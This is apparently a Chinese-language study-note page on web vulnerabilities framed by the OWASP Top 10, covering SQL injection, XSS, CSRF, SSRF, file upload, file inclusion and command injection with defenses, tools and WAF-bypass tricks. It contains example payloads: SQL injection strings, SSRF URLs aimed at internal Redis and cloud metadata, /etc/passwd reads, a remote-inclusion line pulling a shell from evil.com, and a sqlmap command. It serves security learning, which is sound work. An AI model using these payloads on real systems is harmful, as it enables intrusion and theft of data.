---
title: Web 安全漏洞
tags: [Web安全, OWASP, 漏洞]
sources: [[sources/网络安全学习路线]]
---

Web 安全漏洞是 Web 应用在设计、开发或配置中产生的安全缺陷，可被攻击者利用以窃取数据、控制服务器或破坏业务。本页以 OWASP Top 10 为框架，系统整理 SQL 注入、XSS、CSRF、SSRF 等核心漏洞的原理、利用方式和防御方案。

## 定义

Web 安全漏洞是 Web 应用程序在设计、开发、部署或配置过程中产生的安全缺陷，可被攻击者利用以窃取数据、执行代码、控制服务器或破坏业务。**OWASP Top 10** 是最权威的 Web 漏洞分类标准。

## 核心漏洞清单

### SQL 注入（重中之重）

将恶意 SQL 拼接到查询语句中，可读取/篡改数据库甚至 RCE。

```sql
-- 联合查询注入
' UNION SELECT 1,username,password FROM users--
-- 报错注入
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--
-- 布尔盲注 / 时间盲注
' AND IF(1=1,SLEEP(5),0)--
```

**防御**：参数化查询（PreparedStatement）、WAF、输入校验、最小权限原则

### XSS（跨站脚本攻击）

| 类型 | 原理 |
|------|------|
| 反射型 | 参数直接回显到页面 |
| 存储型 | 恶意代码存入数据库 |
| DOM 型 | 前端 JS 动态渲染 |

**防御**：输出编码（HTML Entity Encode）、CSP、HttpOnly Cookie

### CSRF（跨站请求伪造）

诱导用户在已登录站点上执行非预期操作。**防御**：CSRF Token、SameSite Cookie、Referer 校验

### SSRF（服务端请求伪造）

服务器代用户访问内网或云元数据接口。

```
?url=http://127.0.0.1:6379/        # 攻击内网 Redis
?url=http://169.254.169.254/       # 云服务器元数据泄露
```

### 文件上传漏洞

绕过技巧：前端 JS 绕过、MIME 伪造、后缀绕过（.php5/.phtml）、空字节截断、.htaccess 攻击、二次渲染绕过、图片马 + 文件包含

### 文件包含

- **LFI**（本地）：`?page=../../../../../etc/passwd`
- **RFI**（远程）：`?page=http://evil.com/shell.txt`
- **PHP 伪协议**：`php://filter`、`php://input`、`data://`、`phar://`

### 命令注入

```bash
; cat /etc/passwd       # 分号
| cat /etc/passwd       # 管道
$(cat /etc/passwd)      # 命令替换
`cat /etc/passwd`       # 反引号
&& whoami / || whoami   # 逻辑运算
```

### 其他重要漏洞

| 漏洞 | 关键点 |
|------|--------|
| XXE | XML 外部实体注入，可读文件、SSRF、RCE |
| 反序列化 | Java/PHP/Python 不安全反序列化 → RCE |
| 逻辑漏洞 | 越权（水平/垂直）、支付漏洞、密码重置 |
| JWT 攻击 | 算法篡改、密钥爆破、空签名 |
| SSTI | 模板注入（Jinja2/Thymeleaf/Freemarker） |
| CORS | 跨域配置不当导致数据泄露 |

## 核心工具

- **Burp Suite**（必须精通）：Proxy / Repeater / Intruder / Scanner / Decoder
- **SQLMap**：自动化 SQL 注入 `sqlmap -u "http://target/?id=1" --dbs --batch`
- **目录扫描**：dirsearch、gobuster、ffuf
- **WebShell 管理**：蚁剑、冰蝎、哥斯拉

## WAF 绕过常见手法

- **SQL**：大小写混淆、内联注释 `/*!UNION*/`、双重编码、等价替换、空格替代、分块传输
- **XSS**：事件处理器（onerror/onload）、HTML 实体/Unicode 编码、标签变异
- **上传**：双重后缀 shell.php.jpg、特殊后缀 .phtml/.php3/.php5、Content-Type 伪造

## 与其他概念的关系

- [[concepts/网络安全]]：Web 安全是网络安全最高频的攻击面
- [[concepts/渗透测试]]：Web 漏洞是渗透测试的主要利用对象
